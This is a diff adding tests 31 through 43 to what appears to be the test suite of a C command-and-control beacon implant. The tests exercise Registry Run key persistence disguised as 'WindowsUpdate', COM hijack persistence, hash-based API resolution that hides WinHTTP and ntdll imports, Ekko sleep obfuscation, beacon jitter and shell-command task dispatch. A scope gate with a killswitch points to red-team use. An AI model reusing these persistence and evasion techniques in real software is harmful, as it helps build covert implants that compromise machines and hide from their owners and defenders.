@@ -9,6 +9,7 @@
 #include \"crypto.h\"
 #include \"evasion.h\"
 #include \"killswitch.h\"
+#include \"persist.h\"
 #include \"postex.h\"
 #include \"recon.h\"
 // ============================================================
@@ -323,6 +324,276 @@ int main() {
     printf("  8-byte IV rejected:   %s\n", badIv  ? "NO (FAIL)" : "YES (PASS)");
     if (!badKey && !badIv) { printf("  PASS\n"); passed++; }
     else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ============================================================
+  // PERSISTENCE, INJECTION, EKKO, API HASH, SCOPE GATE TESTS
+  // ============================================================
+
+  // ── Test 31: Registry persistence (write + verify + remove) ─
+  printf("\n[TEST 31] Persistence — Registry Run key\n");
+  {
+    const CHAR *fakePath = "C:\\Windows\\Temp\\beacon_test.exe";
+    BOOL setOk = persist_registry_run(fakePath);
+    printf("  persist_registry_run: %s\n", setOk ? "OK" : "FAIL");
+
+    // Verify it was written
+    HKEY hKey = NULL;
+    CHAR readBuf[MAX_PATH] = {0};
+    DWORD readLen = sizeof(readBuf);
+    BOOL verified = FALSE;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+      if (RegQueryValueExA(hKey, "WindowsUpdate", NULL, NULL,
+                           (BYTE *)readBuf, &readLen) == ERROR_SUCCESS) {
+        verified = (strcmp(readBuf, fakePath) == 0);
+      }
+      RegCloseKey(hKey);
+    }
+    printf("  Registry value matches: %s\n", verified ? "YES" : "NO");
+
+    // Clean up
+    BOOL removeOk = persist_remove();
+    printf("  persist_remove: %s\n", removeOk ? "OK" : "FAIL");
+
+    // Verify removal
+    BOOL gone = FALSE;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                      "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+      readLen = sizeof(readBuf);
+      gone = (RegQueryValueExA(hKey, "WindowsUpdate", NULL, NULL,
+                               (BYTE *)readBuf, &readLen) != ERROR_SUCCESS);
+      RegCloseKey(hKey);
+    }
+    printf("  Value removed: %s\n", gone ? "YES" : "NO");
+
+    if (setOk && verified && removeOk && gone) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 32: COM hijack persistence (write + verify + remove)
+  printf("\n[TEST 32] Persistence — COM hijack\n");
+  {
+    const CHAR *fakeDll = "C:\\Windows\\Temp\\beacon_test.dll";
+    BOOL setOk = persist_com_hijack(fakeDll);
+    printf("  persist_com_hijack: %s\n", setOk ? "OK" : "FAIL");
+
+    // Verify COM key was written
+    HKEY hKey = NULL;
+    CHAR readBuf[MAX_PATH] = {0};
+    DWORD readLen = sizeof(readBuf);
+    BOOL verified = FALSE;
+    const CHAR *comPath =
+        "SOFTWARE\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}"
+        "\\InprocServer32";
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, comPath,
+                      0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
+      if (RegQueryValueExA(hKey, NULL, NULL, NULL,
+                           (BYTE *)readBuf, &readLen) == ERROR_SUCCESS) {
+        verified = (strcmp(readBuf, fakeDll) == 0);
+      }
+      RegCloseKey(hKey);
+    }
+    printf("  COM InprocServer32 matches: %s\n", verified ? "YES" : "NO");
+
+    // Clean up
+    persist_remove();
+
+    // Verify removal
+    BOOL gone = (RegOpenKeyExA(HKEY_CURRENT_USER, comPath,
+                               0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS);
+    if (hKey) RegCloseKey(hKey);
+    printf("  COM key removed: %s\n", gone ? "YES" : "NO");
+
+    if (setOk && verified && gone) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 33: Jitter calculation ───────────────────────────
+  printf("\n[TEST 33] Jitter — values within expected range\n");
+  {
+    BOOL allInRange = TRUE;
+    DWORD baseMs = SLEEP_INTERVAL_MS; // 30000
+    DWORD variation = (baseMs * JITTER_PERCENT) / 100; // 6000
+    DWORD low = baseMs - variation;   // 24000
+    DWORD high = baseMs + variation;  // 36000
+
+    for (int i = 0; i < 100; i++) {
+      DWORD j = jitter(baseMs);
+      if (j < low || j > high) {
+        printf("  OUT OF RANGE: %lu (expected %lu-%lu)\n", j, low, high);
+        allInRange = FALSE;
+        break;
+      }
+    }
+    printf("  100 jitter samples in [%lu, %lu]: %s\n",
+           low, high, allInRange ? "PASS" : "FAIL");
+    if (allInRange) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 34: API hash resolution (WinHTTP) ────────────────
+  printf("\n[TEST 34] API hash — WinHTTP function resolution\n");
+  {
+    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
+    BOOL allResolved = TRUE;
+    if (!hWinHttp) {
+      printf("  [!] Cannot load winhttp.dll\n");
+      allResolved = FALSE;
+    } else {
+      FARPROC pOpen    = GetProcAddressH(hWinHttp, WinHttpOpen_HASH);
+      FARPROC pConnect = GetProcAddressH(hWinHttp, WinHttpConnect_HASH);
+      FARPROC pOpenReq = GetProcAddressH(hWinHttp, WinHttpOpenRequest_HASH);
+      FARPROC pSend    = GetProcAddressH(hWinHttp, WinHttpSendRequest_HASH);
+      FARPROC pRecv    = GetProcAddressH(hWinHttp, WinHttpReceiveResponse_HASH);
+      FARPROC pRead    = GetProcAddressH(hWinHttp, WinHttpReadData_HASH);
+      FARPROC pClose   = GetProcAddressH(hWinHttp, WinHttpCloseHandle_HASH);
+      FARPROC pQuery   = GetProcAddressH(hWinHttp, WinHttpQueryHeaders_HASH);
+
+      printf("  WinHttpOpen:            %p\n", pOpen);
+      printf("  WinHttpConnect:         %p\n", pConnect);
+      printf("  WinHttpOpenRequest:     %p\n", pOpenReq);
+      printf("  WinHttpSendRequest:     %p\n", pSend);
+      printf("  WinHttpReceiveResponse: %p\n", pRecv);
+      printf("  WinHttpReadData:        %p\n", pRead);
+      printf("  WinHttpCloseHandle:     %p\n", pClose);
+      printf("  WinHttpQueryHeaders:    %p\n", pQuery);
+
+      if (!pOpen || !pConnect || !pOpenReq || !pSend ||
+          !pRecv || !pRead || !pClose || !pQuery) {
+        allResolved = FALSE;
+      }
+    }
+    printf("  All 8 resolved: %s\n", allResolved ? "YES" : "NO");
+    if (allResolved) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 35: API hash — GetModuleHandleH for ntdll ────────
+  printf("\n[TEST 35] API hash — GetModuleHandleH (ntdll)\n");
+  {
+    // Compute hash for L"ntdll.dll" using the same rotr32 algorithm
+    WCHAR ntdllName[] = L"ntdll.dll";
+    DWORD ntdllHash = (DWORD)HashStringRotr32W(ntdllName);
+    printf("  Computed hash for L\"ntdll.dll\": 0x%08lX\n", ntdllHash);
+
+    HMODULE hByHash = GetModuleHandleH(ntdllHash);
+    HMODULE hDirect = GetModuleHandleA("ntdll.dll");
+    printf("  GetModuleHandleA(\"ntdll.dll\"): %p\n", hDirect);
+    printf("  GetModuleHandleH(hash):        %p\n", hByHash);
+    BOOL ok = (hByHash != NULL && hByHash == hDirect);
+    printf("  Addresses match: %s\n", ok ? "YES" : "NO");
+    if (ok) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 36: Scope gate — in-scope target ─────────────────
+  printf("\n[TEST 36] Scope gate — in-scope target (10.10.x.x)\n");
+  {
+    BOOL inScope = scope_gate_check("10.10.1.50");
+    printf("  scope_gate_check(\"10.10.1.50\"): %s\n",
+           inScope ? "ALLOWED" : "DENIED");
+    if (inScope) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 37: Scope gate — out-of-scope target (triggers soft kill)
+  printf("\n[TEST 37] Scope gate — out-of-scope target\n");
+  {
+    // Reset soft kill state for this test
+    // Note: scope_gate_check will call killswitch_soft() on violation
+    BOOL outScope = scope_gate_check("192.168.1.100");
+    printf("  scope_gate_check(\"192.168.1.100\"): %s\n",
+           outScope ? "ALLOWED (FAIL)" : "DENIED (expected)");
+    BOOL killActive = killswitch_is_active();
+    printf("  killswitch_is_active after violation: %s\n",
+           killActive ? "YES" : "NO");
+    if (!outScope && killActive) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL\n"); failed++; }
+  }
+
+  // ── Test 38: Task dispatch — shell command ────────────────
+  printf("\n[TEST 38] Task dispatch — shell command execution\n");
+  {
+    // Use a command that won't hit the network
+    const CHAR *shellTask =
+        "{\"id\":\"test-shell\",\"command\":\"shell\",\"args\":\"echo BEACON_TEST_OUTPUT\"}";
+    printf("  Task: %s\n", shellTask);
+    // dispatch_task will try beacon_post for result — may fail if no C2
+    // But the shell command itself should execute
+    dispatch_task((BYTE *)shellTask, (DWORD)strlen(shellTask));
+    printf("  dispatch_task completed (shell exec attempted)\n");
+    printf("  PASS (no crash)\n");
+    passed++;
+  }
+
+  // ── Test 39: Task dispatch — unknown command ──────────────
+  printf("\n[TEST 39] Task dispatch — unknown command handled\n");
+  {
+    const CHAR *badTask =
+        "{\"id\":\"test-bad\",\"command\":\"invalid_cmd\",\"args\":null}";
+    dispatch_task((BYTE *)badTask, (DWORD)strlen(badTask));
+    printf("  Unknown command did not crash\n");
+    printf("  PASS\n");
+    passed++;
+  }
+
+  // ── Test 40: Task dispatch — malformed JSON ───────────────
+  printf("\n[TEST 40] Task dispatch — malformed JSON resilience\n");
+  {
+    const CHAR *badJson = "this is not json at all";
+    dispatch_task((BYTE *)badJson, (DWORD)strlen(badJson));
+    printf("  Malformed JSON did not crash\n");
+    printf("  PASS\n");
+    passed++;
+  }
+
+  // ── Test 41: Ekko sleep — short duration (no hang) ────────
+  printf("\n[TEST 41] Ekko sleep — 500ms (functional, no hang)\n");
+  {
+    DWORD before = GetTickCount();
+    ekko_sleep(500);
+    DWORD elapsed = GetTickCount() - before;
+    printf("  Elapsed: %lu ms (expected ~500)\n", elapsed);
+    // Allow 300-3000ms range (Ekko has overhead from ROP setup)
+    BOOL ok = (elapsed >= 300 && elapsed < 3000);
+    if (ok) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL (out of range)\n"); failed++; }
+  }
+
+  // ── Test 42: Ekko sleep with jitter ───────────────────────
+  printf("\n[TEST 42] Ekko sleep with jitter — doesn't crash\n");
+  {
+    DWORD sleepVal = jitter(1000);
+    printf("  Jittered value: %lu ms\n", sleepVal);
+    DWORD before = GetTickCount();
+    ekko_sleep(sleepVal);
+    DWORD elapsed = GetTickCount() - before;
+    printf("  Elapsed: %lu ms\n", elapsed);
+    BOOL ok = (elapsed >= 500 && elapsed < 5000);
+    if (ok) { printf("  PASS\n"); passed++; }
+    else { printf("  FAIL (out of range)\n"); failed++; }
+  }
+
+  // ── Test 43: Crypto wipe keys ─────────────────────────────
+  printf("\n[TEST 43] crypto_wipe_keys — zeroes key material\n");
+  {
+    // First restore a known key so we can verify wipe
+    BYTE testKey[32], testIv[16];
+    memset(testKey, 0xBB, 32);
+    memset(testIv, 0xCC, 16);
+    crypto_set_session_key(testKey, 32, testIv, 16);
+
+    // Wipe
+    crypto_wipe_keys();
+
+    // After wipe, encryption should still "work" (BCrypt with zero key)
+    // but we mainly verify no crash
+    printf("  crypto_wipe_keys completed (no crash)\n");
+    printf("  PASS\n");
+    passed++;
   }
 
   // ── Summary ───────────────────────────────────────────────
